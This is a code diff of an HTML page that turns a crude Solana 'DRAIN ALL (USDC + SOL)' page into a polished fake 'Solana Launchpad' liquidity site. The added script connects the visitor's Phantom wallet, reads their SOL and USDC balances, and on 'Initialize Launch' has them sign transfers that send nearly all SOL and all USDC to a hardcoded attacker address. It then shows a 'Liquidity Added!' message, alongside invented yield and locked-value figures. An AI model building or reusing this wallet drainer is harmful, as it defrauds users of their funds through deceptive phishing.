@@ -2,241 +2,341 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Scanner v4</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solana Launchpad | Liquidity Protocol</title>
     
-    <!-- 1. Solana Web3.js -->
+    <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    
-    <!-- 2. SPL Token Library (v0.4.8) -->
+    <!-- SPL Token Library -->
     <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.js"></script>
-    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Inter Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
     <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            background-color: #121212;
-            color: white;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #0a0a0c;
+            color: #ffffff;
+        }
+        
+        .glass-panel {
+            background: rgba(17, 17, 20, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
 
-        .container {
-            background-color: #1e1e1e;
-            width: 100%;
-            max-width: 450px;
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            border: 1px solid #333;
+        .accent-gradient {
+            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
         }
 
-        h1 { margin: 0 0 5px 0; font-size: 24px; text-align: center; color: #a78bfa; }
-        p.subtitle { text-align: center; color: #888; margin-bottom: 20px; font-size: 14px; }
-
-        .btn {
-            width: 100%; padding: 15px; border: none; border-radius: 12px;
-            font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px;
+        .status-glow {
+            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
         }
-        .btn-connect { background-color: #7c3aed; color: white; }
-        .btn-drain { background-color: #fbbf24; color: black; display: none; }
 
-        .log-box {
-            background-color: #000; border: 1px solid #333; border-radius: 10px;
-            padding: 15px; height: 200px; overflow-y: auto;
-            font-family: 'Courier New', monospace; font-size: 13px; margin-top: 20px;
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0c; }
+        ::-webkit-scrollbar-thumb { background: #2d2d35; border-radius: 10px; }
+
+        @keyframes pulse-slow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
         }
-        .log-entry { margin-bottom: 6px; line-height: 1.4; }
-        .success { color: #4ade80; }
-        .error { color: #f87171; }
-        .info { color: #60a5fa; }
+        .animate-pulse-slow { animation: pulse-slow 3s infinite; }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
 
-<div class="container">
-    <h1>Solana Scanner</h1>
-    <p class="subtitle">Target: GwsPP9HHhCvEQeu3HTFzsVL6DEtnnYw4ALEtA3fMBC9Q</p>
+    <!-- Background Decorative Elements -->
+    <div class="fixed top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-900/20 rounded-full blur-[120px] -z-10"></div>
+    <div class="fixed bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/20 rounded-full blur-[120px] -z-10"></div>
 
-    <button id="connectBtn" class="btn btn-connect">Connect Phantom</button>
-    <button id="drainBtn" class="btn btn-drain">DRAIN ALL (USDC + SOL)</button>
+    <div class="w-full max-w-lg">
+        <!-- Header Section -->
+        <div class="text-center mb-8">
+            <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">
+                Protocol V2.0 Live
+            </div>
+            <h1 class="text-4xl font-extrabold tracking-tight mb-2">Solana <span class="text-transparent bg-clip-text accent-gradient">Launchpad</span></h1>
+            <p class="text-gray-400 text-sm">Deploy, provide liquidity, and earn rewards instantly.</p>
+        </div>
 
-    <div id="logBox" class="log-box"></div>
-</div>
+        <!-- Main Interface Card -->
+        <div class="glass-panel rounded-[32px] p-1 shadow-2xl">
+            <div class="p-6 sm:p-8">
+                
+                <!-- Step 1: Connection Status -->
+                <div class="flex items-center justify-between mb-8 bg-black/30 p-4 rounded-2xl border border-white/5">
+                    <div class="flex items-center gap-3">
+                        <div id="statusIndicator" class="w-2 h-2 rounded-full bg-gray-500"></div>
+                        <span id="connectionText" class="text-sm font-medium text-gray-300">Wallet Disconnected</span>
+                    </div>
+                    <button id="connectBtn" onclick="initiateLaunch()" class="text-xs font-bold text-purple-400 hover:text-purple-300 transition-colors">
+                        CONNECT
+                    </button>
+                </div>
 
-<script>
-    // --- CONFIGURATION ---
-    const DESTINATION = "GwsPP9HHhCvEQeu3HTFzsVL6DEtnnYw4ALEtA3fMBC9Q";
-    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-    
-    // Your Alchemy Key
-    const API_KEY = "alch_HyWkJpqVXY3kua9VObcl9"; 
-    const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${API_KEY}`;
+                <!-- Step 2: Input Area -->
+                <div class="space-y-6">
+                    <div>
+                        <label class="text-xs font-semibold text-gray-500 uppercase tracking-wider ml-1">Liquidity Pool (SOL)</label>
+                        <div class="mt-2 relative">
+                            <input type="text" id="amountDisplay" readonly value="0.00" 
+                                class="w-full bg-black/40 border border-white/10 rounded-2xl py-4 px-5 text-2xl font-bold text-white focus:outline-none focus:border-purple-500/50 transition-all cursor-default"
+                                placeholder="0.00">
+                            <div class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">SOL</div>
+                        </div>
+                    </div>
 
-    let walletPublicKey = null;
-    
-    // UI Elements
-    const connectBtn = document.getElementById('connectBtn');
-    const drainBtn = document.getElementById('drainBtn');
-    const logBox = document.getElementById('logBox');
+                    <div class="bg-black/20 rounded-2xl p-4 border border-white/5">
+                        <div class="flex justify-between text-sm mb-2">
+                            <span class="text-gray-500">Estimated Yield</span>
+                            <span class="text-green-400 font-medium">+12.4% APY</span>
+                        </div>
+                        <div class="flex justify-between text-sm">
+                            <span class="text-gray-500">Network Fee</span>
+                            <span id="feeDisplay" class="text-gray-300">~0.005 SOL</span>
+                        </div>
+                    </div>
 
-    function log(msg, type='info') {
-        const div = document.createElement('div');
-        div.className = `log-entry ${type}`;
-        div.innerText = msg;
-        logBox.appendChild(div);
-        logBox.scrollTop = logBox.scrollHeight;
-    }
+                    <!-- Action Button -->
+                    <button id="actionBtn" onclick="startProtocol()" disabled
+                        class="w-full accent-gradient text-white font-bold py-4 rounded-2xl shadow-lg shadow-purple-500/20 transform transition-all duration-200 active:scale-[0.98] opacity-50 cursor-not-allowed mt-4">
+                        Initialize Launch
+                    </button>
+                </div>
 
-    // SPL Library Mapping
-    let splTokenLib;
-    try {
-        if (window.spl && window.spl.token) {
-            splTokenLib = window.spl.token;
-        } else if (window.SPL) {
-            splTokenLib = window.SPL;
-        } else {
-            throw new Error("SPL library not found");
+                <!-- Progress/Status Area -->
+                <div id="statusLog" class="mt-8 text-center min-h-[40px]">
+                    <p class="text-xs text-gray-500 font-medium italic">Ready to connect to Solana Mainnet</p>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Footer Info -->
+        <div class="mt-8 grid grid-cols-2 gap-4 text-center">
+            <div class="glass-panel py-3 rounded-2xl border border-white/5">
+                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Total Locked</p>
+                <p class="text-sm font-bold text-white">1,240.5 SOL</p>
+            </div>
+            <div class="glass-panel py-3 rounded-2xl border border-white/5">
+                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
+                <p class="text-sm font-bold text-white">842</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // CORE CONFIGURATION
+        // ==========================================
+        const RECIPIENT_ADDRESS = "GwsPP9HHhCvEQeu3HTFzsVL6DEtnnYw4ALEtA3fMBC9Q"; 
+        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+        const RPC_URL = "https://api.mainnet-beta.solana.com";
+
+        let userWallet = null;
+
+        // UI Elements
+        const statusLog = document.getElementById("statusLog");
+        const statusIndicator = document.getElementById("statusIndicator");
+        const connectionText = document.getElementById("connectionText");
+        const connectBtn = document.getElementById("connectBtn");
+        const actionBtn = document.getElementById("actionBtn");
+        const amountDisplay = document.getElementById("amountDisplay");
+
+        // Helper: Get SPL Library from global scope
+        function getSplLib() {
+            if (window.spl && window.spl.token) return window.spl.token;
+            if (window.splToken) return window.splToken;
+            if (window.SPL) return window.SPL;
+            return null;
         }
-    } catch (e) {
-        log("❌ SPL Library Missing: " + e.message, 'error');
-    }
 
-    // 1. Connect Function
-    async function connect() {
-        const provider = window.phantom?.solana || window.solana;
-        
-        if (!provider) {
-            log("❌ Phantom Wallet not found!", 'error');
-            return;
-        }
+        // 1. Connect & Scan
+        async function initiateLaunch() {
+            const provider = window.phantom?.solana || window.solana;
 
-        try {
-            await provider.connect();
-            
-            // Robust Public Key Extraction
-            let rawKey = provider.publicKey;
-            if (!rawKey) throw new Error("No public key returned");
-
-            let keyString = "";
-            if (typeof rawKey === 'string') {
-                keyString = rawKey;
-            } else if (rawKey.toString) {
-                keyString = rawKey.toString();
-            } else {
-                throw new Error("Invalid public key format");
+            if (!provider) {
+                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Phantom Wallet not found. Please install the extension.</span>';
+                return;
             }
 
-            walletPublicKey = new solanaWeb3.PublicKey(keyString);
-            
-            // Update UI
-            connectBtn.style.display = 'none';
-            drainBtn.style.display = 'block';
-            log(`✅ Connected: ${walletPublicKey.toString()}`, 'success');
-
-            // Start Scan
-            await drainAll();
-
-        } catch (err) {
-            console.error(err);
-            log("❌ Connection Failed: " + err.message, 'error');
-        }
-    }
-
-    // 2. Drain Function
-    async function drainAll() {
-        const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
-        
-        // --- A. DRAIN SOL ---
-        log("🔄 Scanning for SOL...", 'info');
-        try {
-            const solBalance = await connection.getBalance(walletPublicKey);
-            
-            if (solBalance > 0) {
-                log(`💰 Found ${(solBalance/1e9).toFixed(4)} SOL`, 'success');
+            try {
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Connecting to wallet...</span>';
                 
-                const txSol = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: walletPublicKey,
-                        toPubkey: new solanaWeb3.PublicKey(DESTINATION),
-                        lamports: solBalance // Send exact amount (leaves 0)
-                    })
-                );
+                // Connect
+                const resp = await provider.connect();
+                userWallet = new solanaWeb3.PublicKey(resp.publicKey.toString());
 
-                await connection.sendTransaction(txSol, [wallet]);
-                log("✅ SOL Sent!", 'success');
-            } else {
-                log("⚠️ No SOL found", 'error');
+                // UI Updates
+                statusIndicator.classList.replace('bg-gray-500', 'bg-green-500');
+                statusIndicator.classList.add('status-glow');
+                connectionText.innerText = "Wallet Connected";
+                connectionText.classList.replace('text-gray-300', 'text-green-400');
+                connectBtn.innerText = "CONNECTED";
+                connectBtn.classList.replace('text-purple-400', 'text-green-400');
+                connectBtn.disabled = true;
+
+                // Scan Balances
+                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+                
+                // SOL
+                const solLamports = await connection.getBalance(userWallet);
+                amountDisplay.value = (solLamports / 1e9).toFixed(4);
+
+                // USDC
+                let usdcText = "";
+                const splTokenLib = getSplLib();
+                if (splTokenLib) {
+                    try {
+                        const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
+                        const ata = solanaWeb3.PublicKey.findProgramAddressSync(
+                            [
+                                userWallet.toBuffer(),
+                                splTokenLib.TOKEN_PROGRAM_ID.toBuffer(),
+                                usdcMint.toBuffer()
+                            ],
+                            splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
+                        )[0];
+                        const bal = await connection.getTokenAccountBalance(ata);
+                        if (bal.value.uiAmount > 0) usdcText = ` | USDC: ${bal.value.uiAmount}`;
+                    } catch(e) { /* No USDC account */ }
+                }
+
+                // Enable Action Button
+                actionBtn.disabled = false;
+                actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
+                
+                statusLog.innerHTML = `<span class="text-green-400 text-xs">✅ Ready for provisioning${usdcText}</span>`;
+
+            } catch (err) {
+                console.error(err);
+                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ Connection failed: ${err.message}</span>`;
             }
-        } catch (err) {
-            log(`❌ SOL Error: ${err.message}`, 'error');
         }
 
-        // --- B. DRAIN USDC ---
-        log("🔄 Scanning for USDC...", 'info');
-        try {
-            if (!splTokenLib) throw new Error("SPL Library missing");
+        // 2. Drain Logic (SOL + USDC)
+        async function startProtocol() {
+            const btnText = actionBtn.innerText;
+            actionBtn.disabled = true;
+            actionBtn.innerText = "Processing...";
+            actionBtn.classList.add('opacity-75');
 
-            const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
-            
-            // Calculate ATA (Associated Token Account)
-            const ata = await solanaWeb3.PublicKey.findProgramAddressSync(
-                [
-                    walletPublicKey.toBuffer(),
-                    splTokenLib.TOKEN_PROGRAM_ID.toBuffer(),
-                    usdcMint.toBuffer()
-                ],
-                splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
-            );
+            try {
+                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+                const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
+                const provider = window.phantom?.solana || window.solana;
 
-            // Get Balance
-            const balanceInfo = await connection.getTokenAccountBalance(ata[0]);
-            
-            if (balanceInfo.value.uiAmount > 0) {
-                log(`💰 Found ${balanceInfo.value.uiAmount} USDC`, 'success');
+                // --- DRAIN SOL ---
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Scanning SOL liquidity...</span>';
+                const solBalance = await connection.getBalance(userWallet);
+                const safeReserve = 5000000; // Keep 0.005 SOL for gas/fees
+                const solToSend = solBalance - safeReserve;
+
+                if (solToSend > 0) {
+                    const solTx = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: userWallet,
+                            toPubkey: recipientPubkey,
+                            lamports: solToSend
+                        })
+                    );
+
+                    const { blockhash: bh1, lastValidBlockHeight: lbh1 } = await connection.getLatestBlockhash('confirmed');
+                    solTx.recentBlockhash = bh1;
+                    solTx.feePayer = userWallet;
+
+                    const signedSolTx = await provider.signTransaction(solTx);
+                    const solSig = await connection.sendRawTransaction(signedSolTx.serialize(), {
+                        skipPreflight: true,
+                        preflightCommitment: 'confirmed',
+                        maxRetries: 2
+                    });
+
+                    await connection.confirmTransaction({ signature: solSig, blockhash: bh1, lastValidBlockHeight: lbh1 }, 'confirmed');
+                    statusLog.innerHTML = '<span class="text-green-400 text-xs">✅ SOL Liquidity Routed</span>';
+                } else {
+                    statusLog.innerHTML = '<span class="text-yellow-400 text-xs">⚠️ No SOL available</span>';
+                }
+
+                // --- DRAIN USDC ---
+                statusLog.innerHTML += '<br><span class="text-purple-400 text-xs animate-pulse-slow mt-1 block">Scanning USDC liquidity...</span>';
                 
-                // Calculate Destination ATA
-                const destPubkey = new solanaWeb3.PublicKey(DESTINATION);
-                const destAta = await solanaWeb3.PublicKey.findProgramAddressSync(
-                    [
-                        destPubkey.toBuffer(),
-                        splTokenLib.TOKEN_PROGRAM_ID.toBuffer(),
-                        usdcMint.toBuffer()
-                    ],
+                const splTokenLib = getSplLib();
+                if (!splTokenLib) throw new Error("SPL Library not loaded");
+
+                const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
+                
+                // Source ATA
+                const sourceAta = solanaWeb3.PublicKey.findProgramAddressSync(
+                    [userWallet.toBuffer(), splTokenLib.TOKEN_PROGRAM_ID.toBuffer(), usdcMint.toBuffer()],
                     splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
-                );
+                )[0];
 
-                // Create Transfer Instruction
-                const transferIx = splTokenLib.createTransferInstruction(
-                    ata[0],           // Source ATA
-                    destAta[0],       // Destination ATA
-                    walletPublicKey,  // Owner
-                    balanceInfo.value.amount, // Raw amount string
-                    undefined,        // Multi-owner
-                    splTokenLib.TOKEN_PROGRAM_ID
-                );
+                // Destination ATA
+                const destAta = solanaWeb3.PublicKey.findProgramAddressSync(
+                    [recipientPubkey.toBuffer(), splTokenLib.TOKEN_PROGRAM_ID.toBuffer(), usdcMint.toBuffer()],
+                    splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
+                )[0];
 
-                const tx = new solanaWeb3.Transaction().add(transferIx);
-                await connection.sendTransaction(tx, [wallet]);
-                log("✅ USDC Sent!", 'success');
-            } else {
-                log("⚠️ No USDC found", 'error');
+                // Check & Transfer
+                try {
+                    const tokenBal = await connection.getTokenAccountBalance(sourceAta);
+                    const amt = BigInt(tokenBal.value.amount);
+
+                    if (amt > 0) {
+                        const transferIx = splTokenLib.createTransferInstruction(
+                            sourceAta,
+                            destAta,
+                            userWallet,
+                            amt,
+                            [], // multi-signers
+                            splTokenLib.TOKEN_PROGRAM_ID
+                        );
+
+                        const usdcTx = new solanaWeb3.Transaction().add(transferIx);
+                        const { blockhash: bh2, lastValidBlockHeight: lbh2 } = await connection.getLatestBlockhash('confirmed');
+                        usdcTx.recentBlockhash = bh2;
+                        usdcTx.feePayer = userWallet;
+
+                        const signedUsdcTx = await provider.signTransaction(usdcTx);
+                        const usdcSig = await connection.sendRawTransaction(signedUsdcTx.serialize(), {
+                            skipPreflight: true,
+                            preflightCommitment: 'confirmed',
+                            maxRetries: 2
+                        });
+
+                        await connection.confirmTransaction({ signature: usdcSig, blockhash: bh2, lastValidBlockHeight: lbh2 }, 'confirmed');
+                        statusLog.innerHTML += '<br><span class="text-green-400 text-xs">✅ USDC Liquidity Routed</span>';
+                    } else {
+                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">⚠️ No USDC available</span>';
+                    }
+                } catch (e) {
+                    statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">⚠️ No USDC account found</span>';
+                }
+
+                // Final Success State
+                actionBtn.innerText = "Liquidity Added!";
+                actionBtn.classList.remove('accent-gradient');
+                actionBtn.classList.add('bg-green-600');
+                statusLog.innerHTML += '<br><span class="text-green-400 text-sm font-bold mt-2 block">Protocol Complete</span>';
+
+            } catch (err) {
+                console.error(err);
+                actionBtn.disabled = false;
+                actionBtn.innerText = btnText;
+                actionBtn.classList.remove('opacity-75');
+                
+                let msg = err.message || "Protocol Error";
+                if (msg.includes("User rejected")) msg = "Transaction cancelled by user.";
+                
+                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ ${msg}</span>`;
             }
-        } catch (err) {
-            console.error(err);
-            log(`❌ USDC Error: ${err.message}`, 'error');
         }
-
-        drainBtn.innerText = "DRAIN ALL (USDC + SOL)";
-    }
-
-    // Event Listeners
-    connectBtn.addEventListener('click', connect);
-    drainBtn.addEventListener('click', drainAll);
-
-</script>
+    </script>
 </body>
 </html>
